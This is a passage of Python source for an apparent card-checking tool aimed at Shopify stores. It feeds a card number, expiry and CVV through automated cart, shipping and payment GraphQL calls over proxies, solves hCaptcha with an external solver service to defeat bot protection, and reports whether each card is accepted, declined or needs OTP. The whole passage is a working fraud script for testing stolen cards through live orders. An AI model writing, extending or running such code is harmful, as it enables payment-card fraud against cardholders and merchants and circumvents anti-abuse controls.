            url      = ourl
            cart_url = url + '/cart/add.js'
            checkout_url_base = url + '/checkout/'

            # Add to cart
            cart_r = await session.post(cart_url,
                data=f'id={variant_id}&quantity=1',
                headers={**headers, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json'},
                proxy=proxy)
            if cart_r.status != 200:
                cart_r2 = await session.post(cart_url,
                    json={'items': [{'id': int(variant_id), 'quantity': 1}]},
                    headers={**headers, 'Accept': 'application/json'},
                    proxy=proxy)
                if cart_r2.status != 200:
                    return False, f"Cart failed {cart_r2.status}", gateway, total_price, currency

            # Init checkout
            checkout_resp = await session.post(
                checkout_url_base,
                allow_redirects=True,
                headers={**headers, 'Accept': 'text/html,application/xhtml+xml,*/*'},
                proxy=proxy)
            checkout_url = str(checkout_resp.url)
            text = await checkout_resp.text()

            if 'login' in checkout_url.lower():
                return False, "Site requires login", gateway, total_price, currency

            attempt_token_m = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_m.group(1) if attempt_token_m else checkout_url.split('/')[-1].split('?')[0]

            sst = checkout_resp.headers.get('X-Checkout-One-Session-Token') or checkout_resp.headers.get('x-checkout-one-session-token')
            if not sst:
                for start_s, end_s in [
                    ('name="serialized-sessionToken" content="&quot;', '&quot;'),
                    ('name="serialized-sessionToken" content="', '"'),
                    ('"serializedSessionToken":"', '"'),
                    ('data-session-token="', '"'),
                    ('"sessionToken":"', '"'),
                ]:
                    sst = extract_between(text, start_s, end_s)
                    if sst: break

            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            stableId   = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
            merch      = (extract_between(text, 'ProductVariantMerchandise/', '&quot;') or
                          extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                          str(variant_id))

            currency = (extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or
                        extract_between(text, '"currencyCode":"', '"') or 'USD')

            subtotal = (extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or
                        extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"'))
            if not subtotal:
                pm = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = pm.group(1) if pm else "0.01"

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'

            # Shipping proposal (call twice per original script)
            ship_vars = {
                'sessionInput': {'sessionToken': sst},
                'queueToken': queueToken or '',
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'delivery': {
                    'deliveryLines': [{
                        'destination': {'partialStreetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone
                        }},
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {
                                'estimatedTimeInTransit': {'any': True},
                                'shipments': {'any': True}
                            }, 'options': {}
                        },
                        'targetMerchandiseLines': {'any': True},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                },
                'deliveryExpectations': {'deliveryExpectationLines': []},
                'merchandise': {'merchandiseLines': [{
                    'stableId': stableId or '1',
                    'merchandise': {'productVariantReference': {
                        'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                        'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                    }},
                    'quantity': {'items': {'value': 1}},
                    'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                    'lineComponentsSource': None, 'lineComponents': []
                }]},
                'payment': {
                    'totalAmount': {'any': True},
                    'paymentLines': [],
                    'billingAddress': {'streetAddress': {
                        'address1': '', 'city': '', 'countryCode': country_code,
                        'lastName': '', 'zoneCode': 'ENG', 'phone': ''
                    }}
                },
                'buyerIdentity': {
                    'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                    'email': email, 'emailChanged': False,
                    'phoneCountryCode': country_code,
                    'marketingConsent': [{'email': {'value': email}}],
                    'shopPayOptInPhone': {'countryCode': country_code},
                    'rememberMe': False
                },
                'tip': {'tipLines': []},
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                    'proposedTotalIncludedAmount': None,
                    'proposedMixedStateTotalAmount': None,
                    'proposedExemptions': []
                },
                'note': {'message': None, 'customAttributes': []},
                'localizationExtension': {'fields': []},
                'nonNegotiableTerms': None,
                'scriptFingerprint': {
                    'signature': None, 'signatureUuid': None,
                    'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []
                },
                'optionalDuties': {'buyerRefusesDuties': False}
            }
            ship_data = {'query': QUERY_PROPOSAL_SHIPPING, 'variables': ship_vars, 'operationName': 'Proposal'}
            params_proposal = {'operationName': 'Proposal'}

            resp, resp_text = await _gql(session, graphql_url, params_proposal, headers, ship_data)
            await asyncio.sleep(3)
            resp, resp_text = await _gql(session, graphql_url, params_proposal, headers, ship_data)

            if not resp:
                return False, f"Shipping request failed: {resp_text[:80]}", gateway, total_price, currency
            if _is_captcha(resp_text):
                sitekey  = _extract_sitekey(resp_text, text)
                cap_tok  = await _solve_hcaptcha(checkout_url, sitekey, CAPSOLVER_KEY) if CAPSOLVER_KEY else None
                if cap_tok:
                    ship_vars['captcha'] = {'token': cap_tok, 'provider': 'hcaptcha'}
                    ship_data['variables'] = ship_vars
                    resp, resp_text = await _gql(session, graphql_url, params_proposal, headers, ship_data)
                    if _is_captcha(resp_text):
                        return False, "CAPTCHA_BYPASS_FAILED", gateway, total_price, currency
                else:
                    return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                rj = json.loads(resp_text)
            except Exception:
                return False, "Invalid JSON in shipping proposal", gateway, total_price, currency

            if 'errors' in rj:
                return False, '; '.join(e.get('message','?') for e in rj['errors'][:2]), gateway, total_price, currency

            session_data = rj.get('data', {}).get('session', {})
            negotiate    = (session_data or {}).get('negotiate', {})
            result       = (negotiate or {}).get('result', {})
            result_type  = (result or {}).get('__typename', '')

            if result_type == 'CheckpointDenied':
                return False, "Checkpoint Denied", gateway, total_price, currency
            if result_type == 'Throttled':
                return False, "Throttled", gateway, total_price, currency
            if result_type == 'NegotiationResultFailed':
                return False, "Negotiation Failed", gateway, total_price, currency

            checkpoint_data = (result or {}).get('checkpointData')
            seller_proposal = (result or {}).get('sellerProposal', {})
            if not seller_proposal:
                return False, "No seller proposal", gateway, total_price, currency

            running_total_data = seller_proposal.get('runningTotal')
            if not running_total_data:
                return False, "No running total", gateway, total_price, currency
            running_total = running_total_data['value']['amount']

            delivery_data = seller_proposal.get('delivery', {})
            delivery_type = (delivery_data or {}).get('__typename', '')
            delivery_strategy = ''
            shipping_amount   = 0.0

            if delivery_type == 'FilledDeliveryTerms':
                dl = (delivery_data or {}).get('deliveryLines', [{}])
                if dl:
                    avail = dl[0].get('availableDeliveryStrategies', [])
                    if avail:
                        delivery_strategy = avail[0].get('handle', '')
                        try:
                            shipping_amount = float(avail[0].get('amount', {}).get('value', {}).get('amount', '0'))
                        except Exception:
                            shipping_amount = 0.0

            tax_data = seller_proposal.get('tax', {})
            tax_amount = 0.0
            if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                try:
                    tax_amount = float(tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0'))
                except Exception:
                    pass

            payment_data = seller_proposal.get('payment', {})
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                for method in payment_data.get('availablePaymentLines', []):
                    pm = method.get('paymentMethod', {})
                    if pm.get('name') or pm.get('paymentMethodIdentifier'):
                        payment_identifier = pm.get('paymentMethodIdentifier')
                        gateway     = pm.get('extensibilityDisplayName') or pm.get('name', 'Shopify Payments')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break

            if not payment_identifier:
                return False, "No payment method found", gateway, total_price, currency

            # Delivery proposal
            ship_vars['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                'options': {}
            }
            ship_vars['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {'lines': [{'stableId': stableId or '1'}]}
            ship_vars['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {'value': {'amount': str(shipping_amount), 'currencyCode': currency}}
            ship_vars['delivery']['deliveryLines'][0]['destinationChanged'] = False
            ship_vars['payment']['billingAddress'] = {'streetAddress': {
                'address1': street, 'address2': address2, 'city': city,
                'countryCode': country_code, 'postalCode': s_zip,
                'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone
            }}
            ship_vars['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
            ship_vars['buyerIdentity']['shopPayOptInPhone']['number'] = phone

            delivery_data2 = {'query': QUERY_PROPOSAL_DELIVERY, 'variables': ship_vars, 'operationName': 'Proposal'}
            resp, resp_text = await _gql(session, graphql_url, params_proposal, headers, delivery_data2)
            if _is_captcha(resp_text):
                sitekey  = _extract_sitekey(resp_text, text)
                cap_tok  = await _solve_hcaptcha(checkout_url, sitekey, CAPSOLVER_KEY) if CAPSOLVER_KEY else None
                if cap_tok:
                    ship_vars['captcha'] = {'token': cap_tok, 'provider': 'hcaptcha'}
                    delivery_data2['variables'] = ship_vars
                    resp, resp_text = await _gql(session, graphql_url, params_proposal, headers, delivery_data2)
                    if _is_captcha(resp_text):
                        return False, "CAPTCHA_BYPASS_FAILED on delivery", gateway, total_price, currency
                else:
                    return False, "CAPTCHA_REQUIRED on delivery", gateway, total_price, currency

            # Tokenize card
            formatted_cc = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
            tok_resp = await session.post('https://deposit.shopifycs.com/sessions', json={
                "credit_card": {
                    "month": mes, "name": f"{firstName} {lastName}",
                    "number": formatted_cc, "verification_value": cvv,
                    "year": ano, "start_month": "", "start_year": "", "issue_number": ""
                },
                "payment_session_scope": f"www.{urlparse(url).netloc}"
            }, proxy=proxy)
            try:
                tok_data = await tok_resp.json()
                token = tok_data.get('id')
                if not token:
                    return False, "Unable to get payment token", gateway, total_price, currency
            except Exception as e:
                return False, f"Token error: {str(e)[:60]}", gateway, total_price, currency

            # Submit
            submit_vars = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {'deliveryLines': [{
                        'destination': {'streetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone
                        }},
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                            'options': {'phone': phone}
                        },
                        'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'value': {'amount': str(shipping_amount), 'currencyCode': currency}},
                        'destinationChanged': False
                    }],
                    'noDeliveryRequired': [], 'useProgressiveRates': True,
                    'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True},
                    'merchandise': {'merchandiseLines': [{
                        'stableId': stableId or '1',
                        'merchandise': {'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                            'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                        }},
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                        'lineComponentsSource': None, 'lineComponents': []
                    }]},
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{'paymentMethod': {'directPaymentMethod': {
                            'paymentMethodIdentifier': payment_identifier,
                            'sessionId': token,
                            'billingAddress': {'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone
                            }},
                            'cardSource': None
                        }},
                        'amount': {'value': {'amount': running_total, 'currencyCode': currency}},
                        'dueAt': None}],
                        'billingAddress': {'streetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone
                        }}
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': str(tax_amount), 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }
            if checkpoint_data:
                submit_vars['input']['checkpointData'] = checkpoint_data

            params_submit = {'operationName': 'SubmitForCompletion'}
            resp, text = await _gql(session, graphql_url, params_submit, headers,
                                    {'query': MUTATION_SUBMIT, 'variables': submit_vars, 'operationName': 'SubmitForCompletion'})

            if _is_captcha(text):
                sitekey  = _extract_sitekey(text, '')
                cap_tok  = await _solve_hcaptcha(checkout_url, sitekey, CAPSOLVER_KEY) if CAPSOLVER_KEY else None
                if cap_tok:
                    submit_vars['captcha'] = {'token': cap_tok, 'provider': 'hcaptcha'}
                    resp, text = await _gql(session, graphql_url, params_submit, headers,
                                            {'query': MUTATION_SUBMIT, 'variables': submit_vars, 'operationName': 'SubmitForCompletion'})
                    if _is_captcha(text):
                        return False, "CAPTCHA_BYPASS_FAILED on submit", gateway, total_price, currency
                else:
                    return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            if "Your order total has changed." in (text or ''):
                return False, "Site not supported", gateway, total_price, currency
            if "The requested payment method is not available." in (text or ''):
                return False, "Payment method not available", gateway, total_price, currency

            try:
                rj2 = json.loads(text)
                submit_data = rj2.get('data', {}).get('submitForCompletion', {})

                if not submit_data:
                    errs = rj2.get('errors', [])
                    if errs:
                        code = errs[0].get('code')
                        return False, code or str(errs[0])[:60], gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency

                rt = submit_data.get('__typename', '')

                if rt in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt and receipt.get('__typename') == 'ProcessedReceipt':
                        return True, "ORDER_PLACED", gateway, total_price, currency
                    rid = (receipt or {}).get('id')
                    if not rid:
                        return False, "SubmitSuccess but no receipt ID", gateway, total_price, currency

                elif rt == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown')
                    return False, extract_clean_response(reason), gateway, total_price, currency

                elif rt == 'SubmitRejected':
                    errs = submit_data.get('errors', [])
                    code = errs[0].get('code') if errs else None
                    return False, code or "Submit Rejected", gateway, total_price, currency

                elif rt == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency

                receipt = submit_data.get('receipt', {})
                rid = (receipt or {}).get('id')
                if not rid:
                    return False, "No receipt ID in submit", gateway, total_price, currency

            except Exception as e:
                return False, f"Parse submit error: {str(e)[:60]}", gateway, total_price, currency

            # Poll for receipt
            params_poll = {'operationName': 'PollForReceipt'}
            poll_data   = {'query': QUERY_POLL, 'variables': {'receiptId': rid, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}

            await asyncio.sleep(3)
            final_text = ''
            for _ in range(4):
                resp, final_text = await _gql(session, graphql_url, params_poll, headers, poll_data)
                if _is_captcha(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency
                try:
                    pj = json.loads(final_text)
                    receipt_data = pj.get('data', {}).get('receipt', {})
                    if receipt_data:
                        tn = receipt_data.get('__typename', '')
                        if tn == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif tn == 'FailedReceipt':
                            code = receipt_data.get('processingError', {}).get('code', 'UNKNOWN_ERROR')
                            return True, code, gateway, total_price, currency
                        elif tn == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        if tn in ['ProcessingReceipt', 'WaitingReceipt']:
                            await asyncio.sleep(4)
                            continue
                except Exception:
                    pass
                if 'WaitingReceipt' in (final_text or ''):
                    await asyncio.sleep(4)
                else:
                    break

            fl = (final_text or '').lower()
            if 'actionreq' in fl or 'action_required' in fl:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in fl or 'shopify_payments' in fl:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in fl or 'declined' in fl:
                code = extract_between(final_text or '', '{"code":"', '"')
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            return False, "Unknown Result", gateway, total_price, currency

    except Exception as e:
        return False, f"Error: {str(e)[:80]}", gateway, total_price, currency


def run_check(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    """Synchronous wrapper — safe to call from a thread."""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(
                process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
            )
        finally:
            loop.close()
    except Exception as e:
        return False, f"Loop error: {str(e)[:80]}", "Shopify Payments", "0.00", "USD"
